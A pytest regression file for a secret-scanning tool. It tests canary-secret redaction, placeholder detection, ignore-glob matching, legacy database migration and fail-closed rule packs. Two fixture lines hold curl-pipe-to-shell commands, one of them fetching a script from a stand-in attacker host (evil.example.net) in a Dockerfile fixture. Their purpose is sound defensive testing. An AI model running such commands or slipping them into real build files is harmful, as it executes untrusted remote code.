"""Regression tests for defects found by the post-implementation adversarial review.

Each test pins a specific bug that was introduced during the 0.2.0 improvement
wave and then fixed. Fake secret values use recognizable canaries; none are real.
"""

from __future__ import annotations

import os
import sqlite3
import stat
import sys
from pathlib import Path

import pytest

from greynoc_nhi.confidence import (
    is_placeholder_value,
    is_structural_placeholder,
    is_weak_placeholder_value,
)
from greynoc_nhi.engine import Engine
from greynoc_nhi.ignore import is_ignored
from greynoc_nhi.masking import looks_like_secret, redact_inline_secret


# --- Finding 1 (critical): real secrets containing a placeholder substring must
# never survive redaction just because is_placeholder_value matched a substring.
@pytest.mark.parametrize(
    "line",
    [
        "RUN export API_TOKEN=R3alTokExampleCANARYxyz987 && curl x | sh",
        "api_token=ghpABCDEFCANARYxyz9876543210_here",
        "password=Xk9v2changemeCANARY8Qw7Lp3Zr5Tn1",
        "client_secret=Dummy0CANARYaB1cD2eF3gH4iJ5kL6mN",
        "AWS_SECRET_ACCESS_KEY = wJalCANARYUtnFEMIK7MDENGbPxRfiCYzsample1",
    ],
)
def test_real_secret_with_placeholder_substring_is_masked(line: str) -> None:
    assert "CANARY" not in redact_inline_secret(line)


def test_structural_placeholders_stay_readable_in_evidence() -> None:
    # Zero-entropy placeholders carry no credential material -> keep readable.
    assert redact_inline_secret("token=${API_KEY}") == "token=${API_KEY}"
    assert redact_inline_secret("password=changeme") == "password=changeme"
    assert redact_inline_secret("api_key: your-token-here") == "api_key: your-token-here"


def test_end_to_end_report_does_not_leak_placeholder_shaped_secret(tmp_path: Path) -> None:
    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "Dockerfile").write_text(
        "FROM python:3.11\n"
        "RUN export API_TOKEN=R3alTokExampleCANARYxyz987 && curl https://evil.example.net/i.sh | sh\n",
        encoding="utf-8",
    )
    res = Engine(db_path=None, cache_enabled=False).run_scan(proj, persist=False, enrich_owners=False)
    for ident in res.identities:
        for piece in list(ident.evidence or []) + [ident.masked_secret or ""]:
            assert "CANARY" not in piece
    for finding in res.findings:
        for piece in finding.evidence or []:
            assert "CANARY" not in piece


# --- Finding 2 (high): a real high-entropy token that merely ends in "_here" or
# contains a placeholder word must still be DETECTED (at low confidence), not
# suppressed. Genuine low-entropy placeholder phrases are still suppressed.
def test_high_entropy_token_with_placeholder_marker_is_detected_low_confidence() -> None:
    token = "ghp_Zk84hJq2LmNo6PrS3tUv9wXy1Cd7Ef_here"
    assert looks_like_secret(token) is True
    assert is_placeholder_value(token) is False
    assert is_weak_placeholder_value(token) is True


def test_low_entropy_placeholder_phrase_is_suppressed() -> None:
    for phrase in ["your-token-here", "replace_with_real_key", "INSERT_API_KEY_HERE"]:
        assert is_placeholder_value(phrase) is True
        assert looks_like_secret(phrase) is False


def test_structural_placeholder_excludes_credential_shaped_test_keys() -> None:
    # Stripe test keys are placeholders for detection but are NOT structural
    # (they carry credential material) so evidence redaction still masks them.
    # Split literal keeps the blob free of contiguous tokens (push protection).
    stripe_test_key = "sk_test_" "4eC39HqLyjWDarjtT1zdp7dc"
    assert is_structural_placeholder(stripe_test_key) is False
    assert is_placeholder_value(stripe_test_key) is True


# --- Finding 2 (high): a passphrase-style credential must not be suppressed or
# leaked just because it embeds a common word (sample/insert/here). Only phrases
# that LEAD with an explicit fill-in marker are treated as placeholders.
@pytest.mark.parametrize(
    "value",
    [
        "Correct-Horse-Sample-Staple",
        "Vivid-Rhubarb-Insert-Cobalt",
        "Amber-Falcon-Meadow-Here",
        "Data-Subsample-Ridge-Cobalt",
    ],
)
def test_passphrase_credentials_are_detected_and_masked(value: str) -> None:
    assert looks_like_secret(value) is True
    assert is_placeholder_value(value) is False
    assert "CANARY" not in redact_inline_secret(f'token: "{value}CANARY"')


def test_intent_led_phrases_are_still_suppressed() -> None:
    for phrase in ["your-token-here", "replace_with_real_key", "INSERT_API_KEY_HERE", "your_token"]:
        assert is_placeholder_value(phrase) is True


# --- Finding 3 (high): anchored .greynocignore wildcards must not cross '/'.
def test_anchored_ignore_wildcard_does_not_match_nested(tmp_path: Path) -> None:
    root = tmp_path
    assert is_ignored(root / "app.env", root, ["/*.env"], rel="app.env") is True
    assert is_ignored(root / "sub/app.env", root, ["/*.env"], rel="sub/app.env") is False
    # Unanchored patterns still match by basename at any depth.
    assert is_ignored(root / "sub/app.env", root, ["*.env"], rel="sub/app.env") is True
    # Directory prefixes still ignore everything beneath them.
    assert is_ignored(root / "build/x.js", root, ["build"], rel="build/x.js") is True


def test_double_star_glob_matches_git_segment_semantics(tmp_path: Path) -> None:
    root = tmp_path
    # `**/name` matches whole-segment boundaries only (like git check-ignore).
    assert is_ignored(root / "config.env", root, ["**/config.env"], rel="config.env") is True
    assert is_ignored(root / "a/b/config.env", root, ["**/config.env"], rel="a/b/config.env") is True
    # The dangerous under-scan: must NOT match a partial file-name prefix.
    assert is_ignored(root / "myconfig.env", root, ["**/config.env"], rel="myconfig.env") is False
    assert is_ignored(root / "a/xb", root, ["a/**/b"], rel="a/xb") is False
    assert is_ignored(root / "a/x/b", root, ["a/**/b"], rel="a/x/b") is True


# --- Finding 4 (high): opening a read-only legacy (v0) DB must not crash; it
# degrades to read-only instead of raising during migration.
def _write_v0_db(path: Path) -> None:
    conn = sqlite3.connect(path)
    conn.executescript(
        """
        CREATE TABLE scans (scan_id TEXT PRIMARY KEY, project_path TEXT NOT NULL,
            started_at TEXT NOT NULL, completed_at TEXT NOT NULL,
            overall_score INTEGER NOT NULL, summary TEXT NOT NULL, stats_json TEXT NOT NULL);
        CREATE TABLE identities (id TEXT PRIMARY KEY, scan_id TEXT NOT NULL, data_json TEXT NOT NULL);
        CREATE TABLE findings (id TEXT PRIMARY KEY, scan_id TEXT NOT NULL, data_json TEXT NOT NULL);
        CREATE TABLE risk_paths (id TEXT PRIMARY KEY, scan_id TEXT NOT NULL, data_json TEXT NOT NULL);
        CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, scan_id TEXT NOT NULL,
            report_type TEXT NOT NULL, path TEXT NOT NULL, created_at TEXT NOT NULL);
        """
    )
    conn.commit()
    conn.close()


@pytest.mark.skipif(sys.platform == "win32", reason="chmod read-only is unreliable on Windows")
def test_readonly_legacy_db_opens_without_crashing(tmp_path: Path) -> None:
    from greynoc_nhi.storage import Storage

    db = tmp_path / "ro_v0.sqlite3"
    _write_v0_db(db)
    os.chmod(db, stat.S_IREAD)
    try:
        storage = Storage(db)  # must not raise
        assert storage.list_scans() == []
    finally:
        os.chmod(db, stat.S_IWRITE | stat.S_IREAD)


def test_writable_legacy_db_migrates_to_v1(tmp_path: Path) -> None:
    from greynoc_nhi.storage import SCHEMA_VERSION, Storage

    db = tmp_path / "v0.sqlite3"
    _write_v0_db(db)
    Storage(db)  # triggers migration
    conn = sqlite3.connect(db)
    try:
        version = conn.execute("PRAGMA user_version").fetchone()[0]
        assert version == SCHEMA_VERSION
        tables = {row[0] for row in conn.execute("SELECT name FROM sqlite_master WHERE type='table'")}
        assert "reports" not in tables
        # identities now has a composite primary key (scan_id, id).
        pk_cols = [r[1] for r in conn.execute("PRAGMA table_info(identities)") if r[5]]
        assert set(pk_cols) == {"scan_id", "id"}
    finally:
        conn.close()


# --- Finding 4 (medium): --rules must fail closed when a declared pack loads no
# valid rules (e.g. an uncompilable regex), not silently scan with zero rules.
def test_rules_pack_with_no_loadable_rules_fails_closed(tmp_path: Path) -> None:
    from greynoc_nhi.cli import main

    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "config.py").write_text('service_token = "acme_LIVE0123456789ABCDEFGHIJ"\n', encoding="utf-8")
    bad_pack = tmp_path / "rules.json"
    # Unbalanced '[' -> the only rule's pattern will not compile.
    bad_pack.write_text('{"rules": [{"id": "acme", "title": "t", "severity": "high", "pattern": "acme_[A-Z0-9+"}]}', encoding="utf-8")
    code = main([
        "--scan", str(proj),
        "--rules", str(bad_pack),
        "--out", str(tmp_path / "out"),
        "--db", str(tmp_path / "db.sqlite3"),
        "--no-cache",
        "--fail-on-new", "low",
    ])
    assert code == 3  # EXIT_CONFIG_ERROR


def test_valid_rules_pack_is_accepted(tmp_path: Path) -> None:
    from greynoc_nhi.cli import main

    proj = tmp_path / "proj"
    proj.mkdir()
    (proj / "config.py").write_text('x = "hello world"\n', encoding="utf-8")
    good_pack = tmp_path / "rules.json"
    good_pack.write_text('{"rules": [{"id": "acme", "title": "t", "severity": "high", "pattern": "acme_[A-Z0-9]{16}"}]}', encoding="utf-8")
    code = main([
        "--scan", str(proj),
        "--rules", str(good_pack),
        "--out", str(tmp_path / "out"),
        "--db", str(tmp_path / "db.sqlite3"),
        "--no-cache",
    ])
    assert code == 0  # valid pack, no findings
